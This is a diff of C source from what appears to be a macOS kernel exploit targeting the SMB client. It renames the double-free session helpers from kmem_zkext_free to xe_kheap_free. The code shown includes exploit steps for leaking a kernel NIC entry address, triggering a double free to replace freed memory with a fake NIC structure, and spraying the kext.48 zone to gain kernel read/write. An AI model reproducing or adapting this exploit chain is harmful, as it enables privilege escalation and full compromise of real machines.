@@ -24,7 +24,7 @@
 #include "memory/allocator_rw.h"
 #include "memory/allocator_nrnw.h"
 #include "memory/kheap_alloc.h"
-#include "memory/zkext_free.h"
+#include "memory/kheap_free.h"
 #include "smb/client.h"
 #include "smb/params.h"
 
@@ -133,11 +133,11 @@ static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
 
 typedef struct smb_dev_rw_session_shared {
     _Atomic int ref_cnt;
-    kmem_zkext_free_session_t dbf_session;
+    xe_kheap_free_session_t dbf_session;
 } *smb_dev_rw_session_shared_t;
 
 
-smb_dev_rw_session_shared_t smb_dev_rw_shared_session_create(kmem_zkext_free_session_t dbf_session) {
+smb_dev_rw_session_shared_t smb_dev_rw_shared_session_create(xe_kheap_free_session_t dbf_session) {
     struct smb_dev_rw_session_shared* session = malloc(sizeof(struct smb_dev_rw_session_shared));
     session->ref_cnt = 1;
     session->dbf_session = dbf_session;
@@ -155,7 +155,7 @@ void smb_dev_rw_shared_session_unref(smb_dev_rw_session_shared_t* sessionp) {
     smb_dev_rw_session_shared_t session = *sessionp;
     int old = atomic_fetch_sub(&session->ref_cnt, 1);
     if (old == 1) {
-        kmem_zkext_free_session_destroy(&session->dbf_session);
+        xe_kheap_free_session_destroy(&session->dbf_session);
         free(session);
     }
     *sessionp = NULL;
@@ -336,10 +336,10 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     uintptr_t fake_sockaddr = fake_sockaddr_alloc.address;
     xe_log_debug("allocated socket_address at %p", (void*)fake_sockaddr);
     
-    kmem_zkext_free_session_t dbf_session = kmem_zkext_free_session_create(smb_addr);
+    xe_kheap_free_session_t dbf_session = xe_kheap_free_session_create(smb_addr);
     
     /// STEP 2: Leak the memory of a NIC entry (`struct complete_nic_info_entry`)
-    struct complete_nic_info_entry dbf_nic = kmem_zkext_free_session_prepare(dbf_session);
+    struct complete_nic_info_entry dbf_nic = xe_kheap_free_session_prepare(dbf_session);
     uintptr_t dbf_nic_addr = ((uintptr_t)dbf_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections));
     xe_log_debug("leaked nic at %p", (void*)dbf_nic_addr);
     
@@ -373,7 +373,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     /// with data of `fake_nic` so that after first release and before second release, the memory location
     /// of `dbf_nic` will be replaced with data from `fake_nic`. This will lead to the `fake_sockaddr` and
     /// `fake_sock_addr_entry` from released
-    kmem_zkext_free_session_execute(dbf_session, &fake_nic);
+    xe_kheap_free_session_execute(dbf_session, &fake_nic);
     
     /// STEP 6: Spray kext.48 zone with allocations from `kmem_allocator_rw_t`. This will lead to
     /// released memory of `fake_sockaddr` and `fake_sock_addr_entry` from being replace by an
